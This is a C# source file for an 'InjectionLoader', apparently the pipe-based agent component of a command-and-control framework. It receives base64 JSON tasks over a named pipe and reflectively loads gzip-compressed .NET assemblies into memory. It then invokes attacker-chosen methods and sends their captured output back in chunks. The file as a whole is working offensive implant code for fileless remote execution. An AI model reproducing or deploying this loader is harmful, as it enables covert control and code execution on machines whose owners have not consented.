using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.IO.Pipes;
using System.Net;
using System.Text;
using System.Web.Script.Serialization;

public class InjectionLoader
{
    public static void LoadRP()
    {
        string pipename = GetPipeName();
        try
        {
            using (var pipe = new NamedPipeClientStream(".", pipename, PipeDirection.InOut))
            {
                pipe.Connect(5000);
                pipe.ReadMode = PipeTransmissionMode.Message;
                TaskMsg task = GetTaskSMB(pipe);

                StringBuilder myb = new StringBuilder();
                StringWriter sw = new StringWriter(myb);
                TextWriter oldOut = Console.Out;
                Console.SetOut(sw);
                Console.SetError(sw);

                string classname = task.ModuleTask.Moduleclass;
                string assembly = task.ModuleTask.Assembly;
                string method = task.ModuleTask.Method;
                string[] paramsv = task.ModuleTask.Parameters;
                RunAssembly(assembly, classname, method, new object[] { paramsv });
                
                string output = myb.ToString();

                Console.SetOut(oldOut);
                Console.SetError(oldOut);
                sw.Flush();
                sw.Close();

                Console.WriteLine(Convert.ToBase64String(Encoding.Default.GetBytes(output)));
                
                Environment.Exit(0);
                //SendOutputSMB(output, pipe);
            }
        }
        catch(Exception e)
        {
            Console.WriteLine("[x] error " + e.Message);
            Console.WriteLine("[x] error " + e.StackTrace);
        }
    }

    private static string GetPipeName()
    {
        string pipename = Dns.GetHostName();
        pipename += Process.GetCurrentProcess().Id.ToString();
        return pipename;

    }

    public static void RunAssembly(string resname, string type, string method, object[] args)
    {
         
        
        System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(getPayload(resname));
        Type assemblyType = assembly.GetType(type);
        object assemblyObject = Activator.CreateInstance(assemblyType);

        assemblyType.InvokeMember(method, System.Reflection.BindingFlags.InvokeMethod | System.Reflection.BindingFlags.Static |
            System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.IgnoreReturn, null, assemblyObject, args);
    }

    public static void SendOutputSMB(string output, NamedPipeClientStream pipe)
    {
        ResponseMsg respmsg = new ResponseMsg();
        respmsg.Chunked = false;
        int chunksize = 1024;
        //Response need to be splitted
        if (output.Length > chunksize)
            respmsg.Chunked = true;

        //Chunk number
        int chunknum = output.Length / chunksize;
        if (output.Length % chunksize != 0)
            chunknum++;

        //Console.WriteLine("Chunk number: " + chunknum);

        respmsg.Number = chunknum;

        int iter = 0;
        do
        {
            int remaining = output.Length - (iter * chunksize);
            if (remaining > chunksize)
                remaining = chunksize;

            respmsg.Data = output.Substring(iter * chunksize, remaining);

            string responsechunkmsg = new JavaScriptSerializer().Serialize(respmsg);
            byte[] responsechunkmsgbyte = Encoding.Default.GetBytes(responsechunkmsg);

            var responsechunk = Encoding.Default.GetBytes(Convert.ToBase64String(responsechunkmsgbyte));

            pipe.Write(responsechunk, 0, responsechunk.Length);

            iter++;
        }
        while (chunknum > iter);
    }

    public static TaskMsg GetTaskSMB(NamedPipeClientStream pipe)
    {

        byte[] messageBytes = ReadMessage(pipe);
        byte[] line = Convert.FromBase64String(Encoding.Default.GetString(messageBytes));
        //Console.WriteLine("[*] Received: {0}", Encoding.Default.GetString(line));

        TaskMsg task = new TaskMsg();
        try
        {
            task = new JavaScriptSerializer().Deserialize<TaskMsg>(Encoding.Default.GetString(line));
            if(task.Chunked)
            {
                for(int i = 1; i < task.ChunkNumber; i++)
                {
                    messageBytes = ReadMessage(pipe);
                    line = Convert.FromBase64String(Encoding.Default.GetString(messageBytes));
                    TaskMsg tmpmsg = new JavaScriptSerializer().Deserialize<TaskMsg>(Encoding.Default.GetString(line));
                    task.ModuleTask.Assembly += tmpmsg.ModuleTask.Assembly;
                }
            }
        }
        catch (Exception e)
        {
            Console.WriteLine("[*] Error: {0}", e.Message);
            Console.WriteLine("[*] Error: {0}", e.StackTrace);
        }

        return task;

    }

    private static byte[] ReadMessage(PipeStream pipe)
    {
        byte[] buffer = new byte[1024];
        using (var ms = new MemoryStream())
        {
            do
            {
                var readBytes = pipe.Read(buffer, 0, buffer.Length);
                ms.Write(buffer, 0, readBytes);
            }
            while (!pipe.IsMessageComplete);

            return ms.ToArray();
        }
    }

    public static byte[] getPayload(string payload)
    {
        return DecompressDLL(Convert.FromBase64String(payload));
    }

    public static byte[] DecompressDLL(byte[] gzip)
    {
        using (GZipStream stream = new GZipStream(new MemoryStream(gzip), CompressionMode.Decompress))
        {
            const int size = 4096;
            byte[] buffer = new byte[size];
            using (MemoryStream memory = new MemoryStream())
            {
                int count = 0;
                do
                {
                    count = stream.Read(buffer, 0, size);
                    if (count > 0)
                    {
                        memory.Write(buffer, 0, count);
                    }
                }
                while (count > 0);
                return memory.ToArray();
            }
        }
    }

    public class ModuleConfig
    {
        public string Moduleclass { get; set; }
        public string Method { get; set; }
        public string[] Parameters { get; set; }
        public string Assembly { get; set; }
    }

    public class CommandConfig
    {
        public string Command { get; set; }
        public string[] Parameters { get; set; }
    }

    public class StandardConfig
    {
        public string Moduleclass { get; set; }
        public string Method { get; set; }
        public string[] Parameters { get; set; }
        public string Assembly { get; set; }
    }

    public class FileDownloadConfig
    {
        public string FileNameDest { get; set; }
        public string Moduleclass { get; set; }
        public string Method { get; set; }
        public string[] Parameters { get; set; }
        public string Assembly { get; set; }
    }

    public class TaskMsg
    {
        public string Agentid { get; set; }
        public string Instanceid { get; set; }
        public string AgentPivot { get; set; }
        public string TaskType { get; set; }
        public bool Chunked { get; set; }
        public int ChunkNumber { get; set; }
        public ModuleConfig ModuleTask { get; set; }
        public CommandConfig CommandTask { get; set; }
        public StandardConfig StandardTask { get; set; }
        public FileDownloadConfig DownloadTask { get; set; }
    }

    public class ResponseMsg
    {
        public string Agentid { get; set; }
        public string AgentPivot { get; set; }
        public string TaskInstanceid { get; set; }
        public bool Chunked { get; set; }
        public int Number { get; set; }
        public string Data { get; set; }
    }
}

